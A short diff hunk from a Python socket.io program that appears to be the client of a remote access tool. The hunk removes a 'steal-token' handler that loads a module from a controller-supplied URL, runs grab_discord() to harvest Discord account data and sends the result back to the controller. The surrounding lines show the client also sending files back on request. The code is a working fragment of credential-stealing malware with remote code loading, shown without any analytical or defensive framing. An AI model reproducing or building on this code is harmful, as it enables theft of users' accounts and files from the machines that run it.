@@ -112,13 +112,6 @@ def run(data):
             sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
             print("emited")
 
-    @sio.on("steal-token")
-    def steal_token(data_new):
-        if data_new['uuid'] == data['uuid']:
-            module = create_moduel(data['url']+'discord.py')
-            result = str(module.grab_discord().initialize())
-            print(result)
-            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': 'discord_account_results', 'file':  base64.b64encode(result).decode('utf-8')})
 
 
 
